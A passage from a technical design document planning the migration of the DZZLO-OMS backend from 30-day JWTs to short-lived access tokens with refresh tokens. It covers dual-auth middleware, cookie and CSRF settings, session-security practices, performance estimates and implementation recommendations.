Phase 1 (2-4 weeks):  Deploy new auth endpoints. Old JWT still works.
Phase 2 (2-4 weeks):  Mobile app update ships with new auth. Web app updated.
Phase 3:              Old JWT endpoints deprecated. Force update if needed.
```

### 9.2 Dual-auth middleware

```js
// helpers/auth.js -- supports BOTH old JWT and new hybrid
const jwt = require('jsonwebtoken');
const User = require('../models/users');

exports.protect = asyncHandler(async (req, res, next) => {
  const authHeader = req.headers.authorization || '';
  const token = authHeader.startsWith('Bearer') ? authHeader.split('Bearer ')[1] : '';

  // Also check for session (if using pure sessions)
  // const hasSession = req.session && req.session.userId;

  if (!token) {
    return next(new ErrorResponse('Not authorized. Please login.', 401));
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);

    // Check if this is a NEW short-lived token (has 'v' claim)
    if (decoded.v === 2) {
      // New hybrid auth: trust the token, no DB lookup
      req.user = decoded;
      req.authVersion = 2;
      return next();
    }

    // OLD long-lived token: do DB lookup (current behavior)
    const user = await User.findById(decoded.id)
      .select('-resetPasswordToken -resetPasswordExpire -OTP_Value -OTP_Expire -__v')
      .lean();

    if (!user) {
      return next(new ErrorResponse('User not found', 401));
    }

    req.user = { ...user, iat: decoded.iat, exp: decoded.exp };
    req.authVersion = 1;
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return next(new ErrorResponse('Token expired. Please refresh.', 401));
    }
    return next(new ErrorResponse('Invalid token', 401));
  }
});
```

**New login endpoint (lives alongside old one):**

```js
// POST /api/v3/auth/login      <-- new (issues short-lived access + refresh)
// POST /api/v2/auth/login      <-- old (issues 30-day JWT, still works)
```

**New access token includes version marker:**

```js
const accessToken = jwt.sign(
  {
    v: 2,            // <-- Version marker: this is a new-style token
    id: user._id,
    email: user.email,
    username: user.username,
    co_id: user.co_id,
    role: user.role,
    scope: user.scope,
  },
  process.env.JWT_SECRET,
  { expiresIn: '15m' }
);
```

### 9.3 Migration checklist

```
[ ] 1. Create RefreshToken model
[ ] 2. Create new auth endpoints: POST /auth/login, POST /auth/refresh, POST /auth/logout
[ ] 3. Update protect middleware to handle both old and new tokens
[ ] 4. Deploy to both EC2 instances
[ ] 5. Test with one client (e.g., web app) while mobile still uses old auth
[ ] 6. Update React Native app to use new auth flow
[ ] 7. Ship mobile app update
[ ] 8. Monitor: track req.authVersion in logs to see adoption
[ ] 9. After 90%+ on v2: deprecate old login endpoint
[ ] 10. After 100% on v2: remove old JWT code, reduce JWT_EXPIRE to 15m
```

### 9.4 Backward compatibility

The key insight: both old 30-day JWTs and new 15-minute JWTs are verified with the same `JWT_SECRET` and the same `jwt.verify()` call. The only difference is the `v: 2` claim and the expiry time. Old clients keep working. New clients get the improved flow.

---

## 10. Session Security Best Practices

### 10.1 Cookie configuration (for pure sessions or hybrid refresh token cookie)

```js
cookie: {
  httpOnly: true,     // CRITICAL: JavaScript cannot access this cookie
                      // Prevents XSS from stealing the session/refresh token

  secure: true,       // CRITICAL in production: cookie only sent over HTTPS
                      // Set to false in development (localhost is HTTP)

  sameSite: 'strict', // CSRF protection: cookie not sent on cross-origin requests
                      // 'lax' is also acceptable (allows top-level navigations)
                      // 'none' requires secure:true and is NOT recommended

  maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days. Balance security vs convenience.
                                      // Shorter = more secure, more re-logins.

  domain: '.dzzlo.com',  // Set if API and web app share domain
                          // Omit if they are on different domains

  path: '/api/v3/auth',  // For refresh token: only send to auth endpoints
                          // Reduces exposure surface
}
```

### 10.2 Session fixation prevention

Session fixation: attacker sets a known session ID before the user logs in, then hijacks the session after login.

```js
// ALWAYS regenerate session ID after login
exports.login = asyncHandler(async (req, res, next) => {
  // ... validate credentials ...

  // Regenerate session ID (prevents fixation)
  req.session.regenerate((err) => {
    if (err) return next(new ErrorResponse('Session error', 500));

    req.session.userId = user._id;
    req.session.role = user.role;

    req.session.save((err) => {
      if (err) return next(new ErrorResponse('Session save error', 500));
      res.status(200).json({ success: true, ... });
    });
  });
});
```

**For hybrid JWT approach:** Not applicable. The refresh token is a new random value on every login, so fixation is not possible.

### 10.3 Session hijacking prevention

1. **Bind session to IP (optional, can cause issues with mobile networks):**

```js
// Store IP at login
req.session.ip = req.ip;

// Check on each request
if (req.session.ip !== req.ip) {
  req.session.destroy();
  return next(new ErrorResponse('Session invalidated. Please login again.', 401));
}
// WARNING: Mobile users change IPs frequently (WiFi to cellular).
// This WILL cause forced logouts for mobile users. Not recommended for DZZLO.
```

1. **Bind session to User-Agent (lightweight fingerprinting):**

```js
req.session.ua = req.get('User-Agent');

// Check on each request (less aggressive than IP binding)
if (req.session.ua !== req.get('User-Agent')) {
  req.session.destroy();
  return next(new ErrorResponse('Session invalidated', 401));
}
```

1. **Absolute session timeout:**

```js
req.session.createdAt = req.session.createdAt || Date.now();

// Force re-login after 7 days regardless of activity
if (Date.now() - req.session.createdAt > 7 * 24 * 60 * 60 * 1000) {
  req.session.destroy();
  return next(new ErrorResponse('Session expired. Please login again.', 401));
}
```

### 10.4 CSRF protection

**Pure sessions with cookies NEED CSRF protection:**

```js
// Packages: csurf (deprecated) or csrf-csrf ^3.x or lusca

// Modern approach: Double Submit Cookie pattern
const { doubleCsrf } = require('csrf-csrf');

const { doubleCsrfProtection, generateToken } = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET,
  cookieName: '__csrf',
  cookieOptions: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
  },
  getTokenFromRequest: (req) => req.headers['x-csrf-token'],
});

// Apply to state-changing routes only
app.use('/api/v3', doubleCsrfProtection);

// Login returns CSRF token:
app.post('/api/v3/auth/login', (req, res) => {
  // ... authenticate ...
  const csrfToken = generateToken(req, res);
  res.json({ success: true, csrfToken });
});
```

**Hybrid JWT approach does NOT need CSRF protection** for the access token (it is in Authorization header, not a cookie). The refresh token cookie does need CSRF protection, but since its `path` is restricted to `/api/v3/auth` and uses `sameSite: 'strict'`, the risk is minimal.

### 10.5 Security comparison summary


| Threat                    | Current (30-day JWT in localStorage) | Pure Sessions (httpOnly cookie) | Hybrid (JWT access + refresh cookie)             |
| ------------------------- | ------------------------------------ | ------------------------------- | ------------------------------------------------ |
| **XSS steals token**      | YES -- localStorage readable by JS   | NO -- httpOnly prevents access  | Access in memory (safe), refresh httpOnly (safe) |
| **CSRF**                  | NO risk (Bearer header)              | YES risk (needs CSRF token)     | Minimal (sameSite + path restriction)            |
| **Token theft window**    | 30 days                              | Until session destroyed         | 15 minutes (access)                              |
| **Session fixation**      | N/A                                  | Risk without regeneration       | N/A                                              |
| **Replay attack**         | 30-day window                        | Session lifetime window         | 15-minute window                                 |
| **Fired employee access** | Up to 30 days                        | 0 seconds (destroy session)     | Up to 15 minutes (revoke refresh)                |


---

## 11. Performance Comparison at Scale

### 11.1 Per-request cost breakdown

**Current DZZLO-OMS (JWT with DB lookup):**

```
jwt.verify()                ~0.3-0.5ms    (HS256 HMAC verification)
User.findOne() to Atlas     ~5-20ms       (network round-trip to MongoDB Atlas)
                            -----------
Total per request:          ~5-21ms       for auth
```

**Pure sessions with MongoDB store:**

```
Session lookup (MongoDB)    ~5-20ms       (network round-trip to MongoDB Atlas)
User.findOne() to Atlas     ~5-20ms       (if you still want fresh user data)
                            -----------
Total per request:          ~5-40ms       for auth (worse if double lookup)
OR:                         ~5-20ms       if you store enough in session to skip User.findOne()
```

**Pure sessions with Redis store:**

```
Session lookup (Redis)      ~0.5-2ms      (in-memory, fast)
User.findOne() optional     ~5-20ms
                            -----------
Total per request:          ~0.5-22ms     for auth
```

**Hybrid JWT (recommended):**

```
jwt.verify()                ~0.3-0.5ms    (no DB lookup!)
                            -----------
Total per request:          ~0.3-0.5ms    for auth

Refresh (every 15 min):
RefreshToken.findOne()      ~5-20ms       (one query per 15 minutes)
User.findOne()              ~5-20ms
                            -----------
Total per refresh:          ~10-40ms      (but only once every 15 minutes)
```

### 11.2 The math for DZZLO-OMS

At 130 orders/day, let us estimate 2,000 API requests/day (orders + browsing + other actions).

**Current approach (JWT + DB lookup every request):**

```
2,000 requests x 15ms average auth time = 30,000ms = 30 seconds of DB time per day for auth
```

**Hybrid approach (JWT verify only, DB on refresh):**

```
2,000 requests x 0.4ms jwt.verify = 800ms
+ ~130 refresh calls x 30ms = 3,900ms
= 4,700ms = ~5 seconds of total auth time per day
```

**Savings: ~25 seconds of MongoDB query time per day.** At your scale, this is irrelevant. The choice should be based on SECURITY and DEVELOPER EXPERIENCE, not performance.

### 11.3 At what scale does it matter?


| Requests/day      | Current (DB every req) | Hybrid (JWT verify only) | Savings          |
| ----------------- | ---------------------- | ------------------------ | ---------------- |
| 2,000 (DZZLO now) | 30s DB time            | 5s total                 | 25s (negligible) |
| 20,000            | 5 min DB time          | 50s total                | 4 min            |
| 200,000           | 50 min DB time         | 8 min total              | 42 min           |
| 2,000,000         | 8.3 hours DB time      | 1.4 hours total          | 6.9 hours        |


Performance becomes a real factor at 100K+ requests/day. You are nowhere near that.

---

## 12. Recommendation for DZZLO-OMS

### Tier 1: Do this NOW (minimal effort, maximum security gain)

**Adopt the Hybrid JWT approach (Section 6).**

Reasons specific to DZZLO-OMS:

1. **Solves the fired employee problem.** Revoke refresh token, access expires in 15 minutes.
2. **No new infrastructure.** Refresh tokens stored in MongoDB (you already have Atlas). No Redis needed.
3. **Mobile-friendly.** React Native keeps sending Bearer tokens exactly like today. Only the refresh flow is new.
4. **Eliminates the DB lookup on every request.** Your `getUserFromToken()` currently queries MongoDB on every single request, including in the `logging()` middleware. With 15-minute access tokens, you trust the payload and skip the DB call.
5. **Backward-compatible migration.** Old 30-day JWTs keep working during transition. New short-lived JWTs use the same `jwt.verify()` path.
6. **Fixes the stale data problem.** User data refreshes every 15 minutes instead of every 30 days.
7. **Minimal client changes.** Add a refresh interceptor and a timer. ~50 lines of client code.
8. **Works across your 2 EC2 instances behind ALB.** No sticky sessions. No shared session store needed for the access token path.

### Tier 2: Fix while you are in there

1. **Fix the `protect` middleware bug.** `loggedInUser` is referenced but never defined. It should be:
  ```js
   const loggedInUser = await getUserFromToken(req.headers);
  ```
2. **Stop calling `getUserFromToken()` in the `logging()` middleware.** After the hybrid approach, `req.user` is already set by `protect`. Use `req.user` in the logging middleware instead of making a second DB call.
3. **Add a `refreshToken` path restriction** on the cookie so it is only sent to `/api/v3/auth` endpoints.

### Tier 3: Do NOT do these (yet)

1. **Do NOT add Redis.** At 130 orders/day, Redis is a cost and ops burden with zero benefit.
2. **Do NOT switch to pure server-side sessions.** The hybrid approach gives you session-like revocation without the CSRF complexity and mobile cookie headaches.
3. **Do NOT enable ALB sticky sessions.** They solve the wrong problem and create new ones.

### Implementation effort estimate


| Task                                              | Effort          |
| ------------------------------------------------- | --------------- |
| Create `RefreshToken` model                       | 30 min          |
| New login endpoint (issue access + refresh)       | 1 hour          |
| New refresh endpoint                              | 1 hour          |
| New logout endpoint (revoke refresh tokens)       | 30 min          |
| Update protect middleware (dual-auth)             | 1 hour          |
| Admin force-logout endpoint                       | 30 min          |
| React Native client changes (refresh interceptor) | 2-3 hours       |
| Web client changes                                | 1-2 hours       |
| Testing                                           | 2-3 hours       |
| **Total**                                         | **~1.5-2 days** |


### Decision matrix -- final verdict


| Approach                               | Solves revocation?     | Mobile-friendly? | No new infra? | Simple?    | Recommended? |
| -------------------------------------- | ---------------------- | ---------------- | ------------- | ---------- | ------------ |
| Keep current 30-day JWT                | NO                     | YES              | YES           | YES        | NO           |
| Add JWT blacklist table                | YES (complex)          | YES              | YES           | NO         | NO           |
| Pure server sessions (MongoDB)         | YES                    | COMPLICATED      | YES           | YES        | MAYBE        |
| Pure server sessions (Redis)           | YES                    | COMPLICATED      | NO            | YES        | NO           |
| **Hybrid JWT (short-lived + refresh)** | **YES (15 min delay)** | **YES**          | **YES**       | **MEDIUM** | **YES**      |


---

## Appendix A: Key Package Versions

```
jsonwebtoken          ^9.0.2     (already installed)
express-jwt           ^8.4.1     (already installed, optional -- you use raw jwt.verify)
cookie-parser         ^1.4.5     (already installed)
express-session       ^1.18.0    (only if choosing pure sessions)
connect-mongo         ^5.1.0     (only if choosing pure sessions)
connect-redis         ^7.1.0     (NOT recommended for your scale)
csrf-csrf             ^3.0.0     (only if choosing pure sessions with cookies)
react-native-keychain ^9.0.0     (for secure refresh token storage on mobile)
expo-secure-store     ^13.0.0    (alternative if using Expo)
```

## Appendix B: Relevant Documentation Links

- OWASP Session Management Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- OWASP JWT Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- express-session docs: [https://www.npmjs.com/package/express-session](https://www.npmjs.com/package/express-session)
- connect-mongo docs: [https://www.npmjs.com/package/connect-mongo](https://www.npmjs.com/package/connect-mongo)
- Auth0 - Refresh Token Rotation: [https://auth0.com/docs/secure/tokens/refresh-tokens/refresh-token-rotation](https://auth0.com/docs/secure/tokens/refresh-tokens/refresh-token-rotation)
- RFC 6749 (OAuth 2.0): [https://datatracker.ietf.org/doc/html/rfc6749](https://datatracker.ietf.org/doc/html/rfc6749)
- RFC 7519 (JWT): [https://datatracker.ietf.org/doc/html/rfc7519](https://datatracker.ietf.org/doc/html/rfc7519)

## Appendix C: Files to modify

```
helpers/auth.js               -- Update protect middleware, add dual-auth support
models/users.js               -- Reduce JWT expiry (getSignedJwtToken)
models/refresh_tokens.js      -- NEW: RefreshToken model
helpers/middlewares.js         -- Fix logging() to use req.user instead of re-querying
api_v3/routes/auth.js         -- NEW: /login, /refresh, /logout endpoints
dzzlo_oms.js                  -- Add cookie-parser config (already installed)
```

